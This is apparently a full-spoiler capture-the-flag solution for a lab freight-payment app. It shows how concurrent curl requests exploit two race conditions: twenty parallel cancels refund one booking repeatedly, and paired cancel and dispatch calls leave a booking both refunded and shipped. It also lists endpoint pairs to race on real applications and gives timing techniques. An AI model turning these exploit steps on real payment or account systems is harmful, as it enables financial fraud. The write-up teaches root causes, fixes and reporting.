# Solution — Corvus Freightpay

Full spoilers.

Everything below uses one authenticated session:

```bash
curl -s -c jar -X POST http://localhost:8084/login \
  -d 'email=ops@brightwell-haulage.example&password=Freight!2026'
```

## First: find out what is already protected

Booking is the obvious target — check balance, deduct, insert — so start
by proving to yourself that it holds. You have 400 credits and
`HAM-BUE` costs 310, so at most one booking should ever succeed:

```bash
for i in $(seq 5); do
  curl -s -b jar -X POST http://localhost:8084/api/bookings \
    -H 'Content-Type: application/json' -d '{"lane":"HAM-BUE"}' &
done; wait
```

```
{"id":"BK-0001",...}
{"error":"insufficient credits (need 310, have 90)"}
{"error":"insufficient credits (need 310, have 90)"}
...
```

One accepted, four rejected. The handler is queued behind a per-account
promise chain (`withBookingLock`), added after an incident in November.

**This is the useful part of the exercise, not a dead end.** Confirming
which path is serialised tells you the team knows about races and
patched *the one that was reported*. Everything adjacent to it is
therefore worth more of your attention, not less.

## Objective 1 — `HxBugLabs{th3_r3fund_p4th_w4s_n3v3r_l0ck3d}`

### The bug

`POST /api/bookings/:id/cancel` is not on the lock, with a comment
explaining why:

> a cancellation only ever gives credits back, so it cannot overdraw an
> account

That reasoning is about *overdraft*, which is the failure mode the
November incident produced. The failure mode here is the opposite one.
The handler is:

```js
if (booking.state !== "booked") return res.status(409)...  // check
await settlementRoundTrip();                               // ~60-100 ms window
account.credits += booking.credits;                        // act
booking.state = "cancelled";
```

Between the check and the write there is a real round trip. Every request
that enters that window reads `state === "booked"`, so every one of them
proceeds to add the credits back.

### Exploiting it

You have `BK-0001` from the control test above — 310 credits, state
`booked`. Cancel it twenty times at once:

```bash
for i in $(seq 20); do
  curl -s -b jar -X POST http://localhost:8084/api/bookings/BK-0001/cancel &
done; wait

curl -s -b jar http://localhost:8084/api/account | python3 -m json.tool | head -3
```

```
"credits": 6290
```

90 + (20 × 310). One booking, refunded twenty times. Now book the lane
that no funded account can afford:

```bash
curl -s -b jar -X POST http://localhost:8084/api/bookings \
  -H 'Content-Type: application/json' -d '{"lane":"CHARTER-ANR"}'

curl -s -b jar http://localhost:8084/api/charter
```

```json
{ "lane": "CHARTER-ANR", "charterCode": "HxBugLabs{th3_r3fund_p4th_w4s_n3v3r_l0ck3d}" }
```

`GET /api/audit` shows the twenty `cancelled` events against one booking
— the artifact you would screenshot on a real report.

### Root cause

A **limit overrun**: an operation that should be idempotent (or
at-most-once) is guarded by a check that is not atomic with the write it
protects. The check passes for every request that arrives before any of
them commits.

The reasoning error worth taking away is more interesting than the code:
the team classified cancellation as safe because it *increases* the
balance. Concurrency safety is not about the direction of the change; it
is about whether the state read is still true when the write lands.

Fixes, in descending order of robustness:

- **Conditional write.** `UPDATE bookings SET state='cancelled' WHERE
  id=? AND state='booked'` and refund only if one row changed. The
  database does the comparison and the write in one atomic step.
- **Row lock.** `SELECT ... FOR UPDATE` on the booking inside the same
  transaction as the refund.
- **Idempotency key** on the request, deduplicated at the edge — the
  standard for payment APIs, and it fixes retries at the same time.

An `if` before an `await` is not a lock in any language.

## Objective 2 — `HxBugLabs{tw0_3ndp01nts_0n3_0bj3ct_z3r0_l0cks}`

### The bug

`cancel` and `dispatch` are different endpoints that move the same object
out of the same state. Each reads `state === "booked"`, each awaits, each
writes. Nothing coordinates the two.

Send one of each simultaneously and both pass the guard:

```bash
BK=$(curl -s -b jar -X POST http://localhost:8084/api/bookings \
      -H 'Content-Type: application/json' -d '{"lane":"RTM-SNT"}' \
      | python3 -c 'import sys,json; print(json.load(sys.stdin)["id"])')

curl -s -b jar -X POST http://localhost:8084/api/bookings/$BK/cancel &
curl -s -b jar -X POST http://localhost:8084/api/bookings/$BK/dispatch &
wait
```

The booking is now refunded *and* handed to a carrier:

```bash
curl -s -b jar http://localhost:8084/api/reconciliation | python3 -m json.tool
```

```json
{
  "conflicted": [ { "id": "BK-0003", "state": "cancelled", "carrierRef": "CR-JIX4YU" } ],
  "note": "refunded and dispatched — escalate to the settlement desk",
  "reconciliationToken": "HxBugLabs{tw0_3ndp01nts_0n3_0bj3ct_z3r0_l0cks}"
}
```

A `carrierRef` on a `cancelled` booking is a state the state machine has
no name for. In business terms: the freight ships and the customer keeps
the money.

### Root cause

This is the **multi-endpoint race** (PortSwigger's term; Kettle's 2023
research on race conditions popularised the class). Single-endpoint races
get found because people test one endpoint at a time. Multi-endpoint
races survive because each handler is individually correct — the
invariant they violate belongs to the object, and no single handler owns
it.

The lesson for real targets: **once you find one async state transition,
enumerate every other transition out of the same state and fire them in
pairs.** The high-value pairs on real applications:

| Pair | Impossible state you are aiming for |
| --- | --- |
| cancel + ship | refunded goods that shipped anyway |
| refund + capture | money returned and taken |
| delete + share | resource unreachable but its share link works |
| downgrade + provision | free plan holding paid entitlements |
| revoke + rotate | credential that survives revocation |
| accept invite + remove member | membership with no owning account |

For the timing, the requests have to land inside the same window. On a
real target you cannot rely on a 60 ms sleep being there, so use the
last-byte-sync technique (Turbo Intruder's `engine=Engine.BURP2` with
`gate`, or HTTP/2's single-packet attack) to make arrival simultaneity
independent of network jitter.

## Notes for the report

Two submissions, and the second is the more interesting one.

- **Objective 1** is a straightforward limit overrun. Lead with money:
  "one 310-credit booking refunded 20 times yields 6,200 credits of value
  the account never paid for, sufficient to book a 5,000-credit charter."
  Attach the audit trail showing twenty `cancelled` events against one
  booking ID.
- **Objective 2** needs you to explain why it matters, because a triager
  looking at a single response will see two `200`s and nothing obviously
  wrong. Show the *resulting object* — `state: cancelled` with a
  `carrierRef` — and describe the business outcome. Name the class
  ("multi-endpoint race producing an invalid state transition") so it
  doesn't get merged into the first report as a duplicate.

If you meet this in the wild and only the cancel path is fixed, retest the
dispatch pairing afterwards. Patching one endpoint's lock is exactly how
this codebase got here.
